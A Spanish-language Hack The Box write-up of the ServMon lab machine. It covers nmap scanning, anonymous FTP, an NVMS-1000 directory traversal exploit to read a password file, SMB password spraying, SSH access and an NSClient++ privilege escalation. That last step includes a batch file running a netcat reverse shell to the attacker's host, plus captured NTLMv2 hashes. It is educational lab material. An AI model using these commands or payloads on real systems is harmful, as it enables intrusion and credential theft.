---
title: Hack The Box ServMon
author: k4miyo
date: 2022-01-15
math: true
mermaid: true
image:
  path: /assets/images/htb/hackthebox.png
categories: [Easy, Windows]
tags: [Windows, Powershell, API Fuzzing, Web]
ping: true
---

## ServMon
Se procede con la fase de reconocimiento lanzando primeramente un `ping` a la dirección IP 10.10.10.184.

```bash
❯ ping -c 1 10.10.10.184
PING 10.10.10.184 (10.10.10.184) 56(84) bytes of data.
64 bytes from 10.10.10.184: icmp_seq=1 ttl=127 time=324 ms

--- 10.10.10.184 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 324.431/324.431/324.431/0.000 ms
```

De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de `nmap` para determinar los puertos abiertos de la máquina y exportanto la información al archivo **allPorts**.

```bash
❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.184 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-15 19:53 CST
Initiating SYN Stealth Scan at 19:53        
Scanning 10.10.10.184 [65535 ports]        
Discovered open port 445/tcp on 10.10.10.184  
Discovered open port 135/tcp on 10.10.10.184  
Discovered open port 21/tcp on 10.10.10.184   
Discovered open port 22/tcp on 10.10.10.184   
Discovered open port 139/tcp on 10.10.10.184 
Discovered open port 80/tcp on 10.10.10.184  
Discovered open port 49665/tcp on 10.10.10.184
Discovered open port 49668/tcp on 10.10.10.184
Discovered open port 49666/tcp on 10.10.10.184
Discovered open port 49669/tcp on 10.10.10.184
Discovered open port 5666/tcp on 10.10.10.184 
Discovered open port 6063/tcp on 10.10.10.184
Discovered open port 49670/tcp on 10.10.10.184                                                                                   
Discovered open port 8443/tcp on 10.10.10.184
Discovered open port 49664/tcp on 10.10.10.184
Discovered open port 6699/tcp on 10.10.10.184
Discovered open port 49667/tcp on 10.10.10.184                                                                                   
Discovered open port 5040/tcp on 10.10.10.184                                                                                    
Completed SYN Stealth Scan at 19:53, 15.86s elapsed (65535 total ports)
Nmap scan report for 10.10.10.184           
Host is up, received user-set (0.14s latency).
Scanned at 2022-01-15 19:53:26 CST for 15s  
Not shown: 63964 closed tcp ports (reset), 1553 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE      REASON
21/tcp    open  ftp          syn-ack ttl 127
22/tcp    open  ssh          syn-ack ttl 127
80/tcp    open  http         syn-ack ttl 127
135/tcp   open  msrpc        syn-ack ttl 127
139/tcp   open  netbios-ssn  syn-ack ttl 127
445/tcp   open  microsoft-ds syn-ack ttl 127
5040/tcp  open  unknown      syn-ack ttl 127
5666/tcp  open  nrpe         syn-ack ttl 127
6063/tcp  open  x11          syn-ack ttl 127
6699/tcp  open  napster      syn-ack ttl 127
8443/tcp  open  https-alt    syn-ack ttl 127
49664/tcp open  unknown      syn-ack ttl 127
49665/tcp open  unknown      syn-ack ttl 127
49666/tcp open  unknown      syn-ack ttl 127
49667/tcp open  unknown      syn-ack ttl 127
49668/tcp open  unknown      syn-ack ttl 127
49669/tcp open  unknown      syn-ack ttl 127
49670/tcp open  unknown      syn-ack ttl 127

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.96 seconds
           Raw packets sent: 78068 (3.435MB) | Rcvd: 65689 (2.628MB)
```

Mediante la función [extractPorts](/posts/extractPorts) definida a nivel de `zsh` , se obtiene la información más relevante de la captura grepeable.

```bash
❯ extractPorts allPorts
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: extractPorts.tmp
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 
   2   │ [*] Extracting information...
   3   │ 
   4   │     [*] IP Address: 10.10.10.184
   5   │     [*] Open ports: 21,22,80,135,139,445,5040,5666,6063,6699,8443,49664,49665,49666,49667,49668,49669,49670
   6   │ 
   7   │ [*] Ports copied to clipboard
```

A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.

```bash
❯ nmap -sCV -p21,22,80,135,139,445,5040,5666,6063,6699,8443,49664,49665,49666,49667,49668,49669,49670 10.10.10.184 -oN targeted  
Starting Nmap 7.92 ( https://nmap.org ) at 2022-01-15 19:54 CST                                                                  
Nmap scan report for 10.10.10.184                                                                                                
Host is up (0.14s latency).                                                                                                      
                                                                                                                                 
PORT      STATE SERVICE       VERSION                                                                                            
21/tcp    open  ftp           Microsoft ftpd                                                                                     
| ftp-anon: Anonymous FTP login allowed (FTP code 230)                                                                           
|_01-18-20  11:05AM       <DIR>          Users                                                                                   
| ftp-syst:                                                                                                                      
|_  SYST: Windows_NT                                                                                                             
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)                                                             
| ssh-hostkey:                                                                                                                   
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)                                                                   
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)                                                                  
|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)                                                                
80/tcp    open  http                                                                                                             
|_http-title: Site doesn't have a title (text/html).                                                                             
| fingerprint-strings:                                                                                                           
|   GetRequest, HTTPOptions, RTSPRequest:                                                                                        
|     HTTP/1.1 200 OK                                                                                                            
|     Content-type: text/html                                                                                                    
|     Content-Length: 340                                                                                                        
|     Connection: close                                                                                                          
|     AuthInfo:                                                                                                                  
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">  
|     <html xmlns="http://www.w3.org/1999/xhtml">                                                                                
|     <head>                                                                                                                     
|     <title></title>                                                                                                            
|     <script type="text/javascript">                                                                                            
|     window.location.href = "Pages/login.htm";                                                                                  
|     </script>                                                                                                                  
|     </head>                                                   
|     <body>                                                    
|     </body>                                                   
|     </html>                                                   
|   NULL:                                                       
|     HTTP/1.1 408 Request Timeout                 
|     Content-type: text/html                                                                                                    
|     Content-Length: 0                                         
|     Connection: close                                                                                                          
|_    AuthInfo:
135/tcp   open  msrpc         Microsoft Windows RPC                                                                              
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn                                                                      
445/tcp   open  microsoft-ds?                                                                                                    
5040/tcp  open  unknown                                                                                                          
5666/tcp  open  tcpwrapped                                                                                                       
6063/tcp  open  x11?                                                                                                             
6699/tcp  open  napster?                                                                                                         
8443/tcp  open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest, HTTPOptions, RTSPRequest, SIPOptions: 
|     HTTP/1.1 404
|     Content-Length: 18
|     Document not found
|   GetRequest: 
|     HTTP/1.1 302
|     Content-Length: 0
|     Location: /index.html
|     iday
|_    :Saturday
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2020-01-14T13:24:20
|_Not valid after:  2021-01-13T13:24:20
| http-title: NSClient++
|_Requested resource was /index.html
|_ssl-date: TLS randomness does not represent time
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at http
s://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.92%I=7%D=1/15%Time=61E37ADB%P=x86_64-pc-linux-gnu%r(NULL
SF:,6B,"HTTP/1\.1\x20408\x20Request\x20Timeout\r\nContent-type:\x20text/ht
SF:ml\r\nContent-Length:\x200\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n
SF:\r\n")%r(GetRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20tex
SF:t/html\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x
SF:20\r\n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20X
SF:HTML\x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/D
SF:TD/xhtml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.
SF:org/1999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\
SF:x20\x20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20
SF:\x20\x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x2
SF:0\x20\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")
SF:%r(HTTPOptions,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm
SF:l\r\nContent-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\
SF:n\r\n\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\
SF:x201\.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xh
SF:tml1-transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1
SF:999/xhtml\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x
SF:20\x20<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\
SF:x20\x20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20
SF:\x20\x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n")%r(RT
SF:SPRequest,1B4,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/html\r\n
SF:Content-Length:\x20340\r\nConnection:\x20close\r\nAuthInfo:\x20\r\n\r\n
SF:\xef\xbb\xbf<!DOCTYPE\x20html\x20PUBLIC\x20\"-//W3C//DTD\x20XHTML\x201\
SF:.0\x20Transitional//EN\"\x20\"http://www\.w3\.org/TR/xhtml1/DTD/xhtml1-
SF:transitional\.dtd\">\r\n\r\n<html\x20xmlns=\"http://www\.w3\.org/1999/x
SF:html\">\r\n<head>\r\n\x20\x20\x20\x20<title></title>\r\n\x20\x20\x20\x2
SF:0<script\x20type=\"text/javascript\">\r\n\x20\x20\x20\x20\x20\x20\x20\x
SF:20window\.location\.href\x20=\x20\"Pages/login\.htm\";\r\n\x20\x20\x20\
SF:x20</script>\r\n</head>\r\n<body>\r\n</body>\r\n</html>\r\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8443-TCP:V=7.92%T=SSL%I=7%D=1/15%Time=61E37AE4%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,74,"HTTP/1\.1\x20302\r\nContent-Length:\x200\r\nLocation
SF::\x20/index\.html\r\n\r\n\0\0\0\0\0\0\0\0\0\0iday\0\0\0\0:Saturday\0\0\
SF:0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0")%r(HTTPOptio
SF:ns,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not
SF:\x20found")%r(FourOhFourRequest,36,"HTTP/1\.1\x20404\r\nContent-Length:
SF:\x2018\r\n\r\nDocument\x20not\x20found")%r(RTSPRequest,36,"HTTP/1\.1\x2
SF:0404\r\nContent-Length:\x2018\r\n\r\nDocument\x20not\x20found")%r(SIPOp
SF:tions,36,"HTTP/1\.1\x20404\r\nContent-Length:\x2018\r\n\r\nDocument\x20
SF:not\x20found");
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 59m59s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2022-01-16T02:57:16
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 193.02 seconds
```

Vemos que está abierto el puerto 21 asociado al servicio FTP y que podríamos ingresar como el usuario **anonymous**, así que vamos a validarlo.

```bash
❯ ftp 10.10.10.184
Connected to 10.10.10.184.
220 Microsoft FTP Service
Name (10.10.10.184:k4miyo): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  11:05AM       <DIR>          Users
226 Transfer complete.
ftp> 
```

Tenemos algunso recursos de podemos traer a nuestra máquina.

```bash
ftp> cd Users
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  11:06AM       <DIR>          Nadine
01-18-20  11:08AM       <DIR>          Nathan
226 Transfer complete.
ftp> cd Nadine
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  11:08AM                  174 Confidential.txt
226 Transfer complete.
ftp> get Confidential.txt
local: Confidential.txt remote: Confidential.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
174 bytes received in 0.14 secs (1.2033 kB/s)
ftp> cd ..
250 CWD command successful.
ftp> cd Nathan
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
01-18-20  11:10AM                  186 Notes to do.txt
226 Transfer complete.
ftp> get "Notes to do.txt"
local: Notes to do.txt remote: Notes to do.txt
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
186 bytes received in 0.14 secs (1.3012 kB/s)
ftp>
```

```bash
❯ cat Confidential.txt
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: Confidential.txt
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ Nathan,
   2   │ 
   3   │ I left your Passwords.txt file on your Desktop.  Please remove this once you have edited it yourself and place it back i
       │ nto the secure folder.
   4   │ 
   5   │ Regards
   6   │ 
   7   │ Nadine
```

```bash
❯ cat Notes\ to\ do.txt
───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: Notes to do.txt
───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ 1) Change the password for NVMS - Complete
   2   │ 2) Lock down the NSClient Access - Complete
   3   │ 3) Upload the passwords
   4   │ 4) Remove public access to NVMS
   5   │ 5) Place the secret files in SharePoint
```

Tenemos algo como un tipo correo, una lista de cosas y nombres potenciales de usuarios a nivel de sistema. Vamos a seguir enumerando un poco el sistema y tenemos el puerto 445 abierto, por lo que podriamos tratar de hacer un ***Null Session***; sin embargo, no tenemos acceso. Asi que ahora vamos a ir por los servicios web, tirando primeramente de la herramienta `whatweb`:

```bash
❯ cat targeted | grep http | grep -oP '\d{1,4}/tcp' | awk '{print $1}' FS=/ | xargs | tr " " ","
80,8443
❯ whatweb http://10.10.10.184/
http://10.10.10.184/ [200 OK] Country[RESERVED][ZZ], IP[10.10.10.184], Script[text/javascript], UncommonHeaders[authinfo]
❯ whatweb https://10.10.10.184:8443/
https://10.10.10.184:8443/ [302 Found] Country[RESERVED][ZZ], IP[10.10.10.184], RedirectLocation[/index.html]
https://10.10.10.184:8443/index.html [200 OK] Bootstrap, Country[RESERVED][ZZ], HTML5, IP[10.10.10.184], Script[text/javascript], Title[NSClient++], X-UA-Compatible[IE=edge]
```

Ahora si vamos a echarles un ojo vía web.

![](/assets/images/htb-servmon/servmon-web.png)

![](/assets/images/htb-servmon/servmon-web1.png)

Vamos a empezar por el puerto 80 en donde tenemos un panel de login de **NVMS-1000**, que si no sabemos que es lo podemos buscar en internet (*Software NVMS1000 para centralización de grabadores y cámaras IP Meriva para SO*). Podríamos probar credenciales default, pero vemos que no accedemos; podríamos ver si existe algún exploit público.

```bash
❯ searchsploit nvms 1000
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
NVMS 1000 - Directory Traversal                                                                | hardware/webapps/47774.txt
TVT NVMS 1000 - Directory Traversal                                                            | hardware/webapps/48311.py
----------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Tenemos unos dos que hacen referencia a *Directory Traversal* de forma que podemos leer archivos del sistema y aquí nos preguntamos para que nos sirve; pues bueno, resulta que el usuario **Nadine** le comenta al usuario **Nathan** que en su escritorio dejo un archivo llamado **Passwords.txt**; por lo que ya tenemos una posible ruta `C:\Users\Nathan\Desktop\` y un archivo a leer `Passwords.txt`, así que usaremos la herramienta [nvms.py](https://github.com/AleDiBen/NVMS1000-Exploit/blob/master/nvms.py).

```bash
❯ wget https://raw.githubusercontent.com/AleDiBen/NVMS1000-Exploit/master/nvms.py
--2022-01-15 21:45:28--  https://raw.githubusercontent.com/AleDiBen/NVMS1000-Exploit/master/nvms.py
Resolviendo raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.108.133, 185.199.111.133, ...
Conectando con raw.githubusercontent.com (raw.githubusercontent.com)[185.199.109.133]:443... conectado.
Petición HTTP enviada, esperando respuesta... 200 OK
Longitud: 3032 (3.0K) [text/plain]
Grabando a: «nvms.py»

nvms.py                          100%[=======================================================>]   2.96K  --.-KB/s    en 0s      

2022-01-15 21:45:29 (60.3 MB/s) - «nvms.py» guardado [3032/3032]
❯ python3 nvms.py
****************************************************************
**                      ~CVE 2019-20085~                      **
****************************************************************

USAGE  :
        ./nvms.py <TARGET_IP> <TARGET_FILE> [OUT_FILE]
EXAMPLE:
        python nvms.py 195.135.100.10 Windows/system.ini win.ini
```

La herramienta requiere de los parámetros `<TARGET_IP>`,  `<TARGET_FILE>` y  `[OUT_FILE]`; en donde `<TARGET_IP> = 10.10.10.184`,  `<TARGET_FILE> = Users/Nathan/Desktop/Passwords.txt` y  `[OUT_FILE] = Passwords.txt`; así que vamos a ejecutarla.

```bash
❯ python3 nvms.py 10.10.10.184 Windows/system.ini
[+] DT Attack Succeeded
[+] File Content

++++++++++ BEGIN ++++++++++
; for 16-bit app support
[386Enh]
woafont=dosapp.fon
EGA80WOA.FON=EGA80WOA.FON
EGA40WOA.FON=EGA40WOA.FON
CGA80WOA.FON=CGA80WOA.FON
CGA40WOA.FON=CGA40WOA.FON

[drivers]
wave=mmdrv.dll
timer=timer.drv

[mci]

++++++++++  END  ++++++++++
❯ python3 nvms.py 10.10.10.184 Users/Nathan/Desktop/Passwords.txt Passwords.txt
[+] DT Attack Succeeded
[+] Saving File Content
[+] Saved
[+] File Content

++++++++++ BEGIN ++++++++++
1nsp3ctTh3Way2Mars!
Th3r34r3To0M4nyTrait0r5!
B3WithM30r4ga1n5tMe
L1k3B1gBut7s@W0rk
0nly7h3y0unGWi11F0l10w
IfH3s4b0Utg0t0H1sH0me
Gr4etN3w5w17hMySk1Pa5$
++++++++++  END  ++++++++++
```

Tenemos unas posibles contraseñas de los usuarios que tenemos y además ya validamos que el usuario **Nathan** existe en el sistema; como vemos el puerto 445 abierto, vamos a probar con `crackmapexec`:

```bash
❯ crackmapexec smb 10.10.10.184 -u 'Nathan' -p Passwords.txt
SMB         10.10.10.184    445    SERVMON          [*] Windows 10.0 Build 18362 x64 (name:SERVMON) (domain:ServMon) (signing:False) (SMBv1:False)
SMB         10.10.10.184    445    SERVMON          [-] ServMon\Nathan:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\Nathan:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\Nathan:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\Nathan:L1k3B1gBut7s@W0rk STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\Nathan:0nly7h3y0unGWi11F0l10w STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\Nathan:IfH3s4b0Utg0t0H1sH0me STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\Nathan:Gr4etN3w5w17hMySk1Pa5$ STATUS_LOGON_FAILURE
```

Para el usuario **Nathan** no tenemos resultados, pero podríamos probar para **Nadine**:

```bash
❯ crackmapexec smb 10.10.10.184 -u 'Nadine' -p Passwords.txt
SMB         10.10.10.184    445    SERVMON          [*] Windows 10.0 Build 18362 x64 (name:SERVMON) (domain:ServMon) (signing:False) (SMBv1:False)
SMB         10.10.10.184    445    SERVMON          [-] ServMon\Nadine:1nsp3ctTh3Way2Mars! STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\Nadine:Th3r34r3To0M4nyTrait0r5! STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [-] ServMon\Nadine:B3WithM30r4ga1n5tMe STATUS_LOGON_FAILURE 
SMB         10.10.10.184    445    SERVMON          [+] ServMon\Nadine:L1k3B1gBut7s@W0rk
```

Tenemos las credenciales del usuario **Nadine**, por lo que siempre digo, debemos de guardarlas para tenerlas siempre presentes y vamos a probar si podemos conectarnos por ssh:

```bash
❯ ssh nadine@10.10.10.184
nadine@10.10.10.184's password:

Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>whoami
servmon\nadine

nadine@SERVMON C:\Users\Nadine>
```

Ya nos encontramos dentro de la máquina y podemos visualizar la flag (user.txt). Ahora debemos de enumerar un poco el sistema para ver de que forma podemos escalar privielgios.

```bash
nadine@SERVMON C:\Users\Nadine\Desktop>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled

nadine@SERVMON C:\Users\Nadine\Desktop>
nadine@SERVMON C:\Users\Nadine\Desktop>whoami /all

USER INFORMATION
----------------

User Name      SID
============== =============================================
servmon\nadine S-1-5-21-3877449121-2587550681-992675040-1002


GROUP INFORMATION
-----------------

Group Name                             Type             SID          Attributes
====================================== ================ ============ ==================================================
Everyone                               Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                   Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== =======
SeShutdownPrivilege           Shut down the system                 Enabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Enabled
SeTimeZonePrivilege           Change the time zone                 Enabled


nadine@SERVMON C:\Users\Nadine\Desktop>
```

No vemos nada interesante; sin embargo, debemos recordar que existe el puerto 8443 abierto haciendo mención del servicio **NSClient++**, asi que podríamos echarle un ojo si existe un exploit público.

```bash
❯ searchsploit NSClient
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
NSClient++ 0.5.2.35 - Authenticated Remote Code Execution                                      | json/webapps/48360.txt
NSClient++ 0.5.2.35 - Privilege Escalation                                                     | windows/local/46802.txt
----------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

Tenemos dos recursos, uno de ***Authenticated Remote Code Execution*** y otro de ***Privilege Escalation***, vamos a probar de momento el segundo a ver que nos dice que debemos hacer.

- Nos indica que en la ruta `c:\program files\nsclient++\nsclient.ini` podemos identificar una contraseña de administrador del servicio.

```bash
nadine@SERVMON C:\Users\Nadine\Desktop>type "c:\program files\nsclient++\nsclient.ini" | findstr password
password = ew2x6SsGTxjRwXOT

nadine@SERVMON C:\Users\Nadine\Desktop>
```

- Sin embargo, al logearnos, nos indica un ***403 Your not allowed***.

![](/assets/images/htb-servmon/servmon-web2.png)

- Esto se debe a que si vemos el archivo de configuración del servicio, indica que el único host permitido es la misma máquina víctima (127.0.0.1).

```bash
nadine@SERVMON C:\Users\Nadine\Desktop>type "c:\program files\nsclient++\nsclient.ini"
´╗┐# If you want to fill this file with all available options run the following command:
#   nscp settings --generate --add-defaults --load-all
# If you want to activate a module and bring in all its options use:
#   nscp settings --activate-module <MODULE NAME> --add-defaults 
# For details run: nscp settings --help
                                                                
                                
; in flight - TODO
[/settings/default]                                                                                                              
                                
; Undocumented key
password = ew2x6SsGTxjRwXOT                                                                                                      
                                
; Undocumented key
allowed hosts = 127.0.0.1
```

- Por lo tanto, vamos a hace un ***Local Port Forwarding*** para tener acceso desde nuestra máquina pero como si lo hicieramos desde la máquina víctima.

```bash
❯ ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184
nadine@10.10.10.184's password:

Microsoft Windows [Version 10.0.18363.752]
(c) 2019 Microsoft Corporation. All rights reserved.

nadine@SERVMON C:\Users\Nadine>
```

```bash
❯ lsof -i:8443
COMMAND    PID USER   FD   TYPE DEVICE SIZE/OFF NODE NAME
ssh     307287 root    4u  IPv6 920432      0t0  TCP localhost:8443 (LISTEN)
ssh     307287 root    5u  IPv4 920433      0t0  TCP localhost:8443 (LISTEN)
```

- Ahora si podemos ver el servicio apuntando a nuestra máquina.

![](/assets/images/htb-servmon/servmon-web3.png)

- De acuerdo con el exploit, debemos habilitar los módulos **CheckExternalScripts** y  **Scheduler**.

![](/assets/images/htb-servmon/servmon-web4.png)

![](/assets/images/htb-servmon/servmon-web5.png)

- Debemos crear un script bajo **Settings > External Scripts > Scripts**

![](/assets/images/htb-servmon/servmon-web6.png)

- Vamos a transferior el archivo `nc.exe` y necesitamos crear un archivo de extensión bat que contenga lo siguiente. Ambos archivos los pondremos en la ruta `C:\Temp\`:

```bat
@echo off
C:\Temp\nc.exe 10.10.14.27 443 -e cmd.exe
```

```bash
nadine@SERVMON C:\Temp>copy \\10.10.14.27\smbFolder\privesc.bat privesc.bat
        1 file(s) copied.

nadine@SERVMON C:\Temp>copy \\10.10.14.27\smbFolder\nc.exe nc.exe
        1 file(s) copied.

nadine@SERVMON C:\Temp>
nadine@SERVMON C:\Temp>dir
 Volume in drive C has no label.
 Volume Serial Number is DC93-6115

 Directory of C:\Temp

16/01/2022  06:05    <DIR>          .
16/01/2022  06:05    <DIR>          ..
16/01/2022  05:05            28,160 nc.exe
16/01/2022  04:29                52 privesc.bat
               2 File(s)         28,212 bytes
               2 Dir(s)   6,099,292,160 bytes free

nadine@SERVMON C:\Temp>
```

```bash
❯ impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation        
                                                                
[*] Config file parsed                                          
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0                                                           [*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0                                                           [*] Config file parsed                                                                                                           [*] Config file parsed                                                                                                           [*] Config file parsed                                          
[*] Incoming connection (10.10.10.184,50180)
[*] AUTHENTICATE_MESSAGE (SERVMON\Nadine,SERVMON)
[*] User SERVMON\Nadine authenticated successfully              
[*] Nadine::SERVMON:aaaaaaaaaaaaaaaa:30aec89c753a12e5d36db95e3b3de36c:010100000000000000ec4c74960ad8014d9f3943568f061d00000000010
010007100730061004a006d00520049004800030010007100730061004a006d0052004900480002001000510043004f0064005700740065004d00040010005100
43004f0064005700740065004d000700080000ec4c74960ad801060004000200000008003000300000000000000000000000002000002ebc1373f115123d9554b
6b1f9118ac29ed1499e8690c0db0419656f943f50730a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030
002e00310034002e00320037000000000000000000  
[*] Connecting Share(1:IPC$)                                    
[*] Connecting Share(2:smbFolder)   
[*] Disconnecting Share(1:IPC$)                                 
[*] Disconnecting Share(2:smbFolder)                            
[*] Closing down connection (10.10.10.184,50180)
[*] Remaining connections []                                    
[*] Incoming connection (10.10.10.184,50197)                    
[*] AUTHENTICATE_MESSAGE (SERVMON\Nadine,SERVMON)
[*] User SERVMON\Nadine authenticated successfully
[*] Nadine::SERVMON:aaaaaaaaaaaaaaaa:de5c42e3a755709d52bd91fd227ed271:01010000000000008006bd8c960ad8017de9e43c87de19b600000000010
010007100730061004a006d00520049004800030010007100730061004a006d0052004900480002001000510043004f0064005700740065004d00040010005100
43004f0064005700740065004d00070008008006bd8c960ad801060004000200000008003000300000000000000000000000002000002ebc1373f115123d9554b
6b1f9118ac29ed1499e8690c0db0419656f943f50730a001000000000000000000000000000000000000900200063006900660073002f00310030002e00310030
002e00310034002e00320037000000000000000000
[*] Connecting Share(1:smbFolder)   
[*] AUTHENTICATE_MESSAGE (\,SERVMON)
```

- Ahora creamos hacemos click en **Control > Reload** y esperamos a que se restablezca el servicio.

![](/assets/images/htb-servmon/servmon-web7.png)

